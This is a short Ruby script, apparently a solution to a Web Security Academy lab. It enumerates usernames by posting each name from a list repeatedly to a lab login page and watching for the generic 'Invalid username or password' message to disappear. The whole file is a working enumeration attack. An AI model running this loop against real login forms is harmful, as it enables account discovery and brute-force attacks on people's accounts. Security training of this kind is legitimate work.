# frozen_string_literal: true

require 'uri'
require 'net/http'

TARGET = 'https://0ae100b3035f30f5c2f536c7004100da.web-security-academy.net/login'

uri = URI(TARGET)

USERNAMES = 'username_list.txt'

# Username Enumeration
LIMIT = 3
File.readlines(USERNAMES).each do |line|
  l = line.strip
  puts "Trying #{l}"
  found = catch :found do
    (0..LIMIT).map do
      res = Net::HTTP.post_form(uri, username: l, password: 'test')
      next if res.body.include?('<p class=is-warning>Invalid username or password.</p>')

      puts "Found: #{l}\tStatus:#{res.code}"
      throw :found, true
    end
    false
  end
  break if found
end
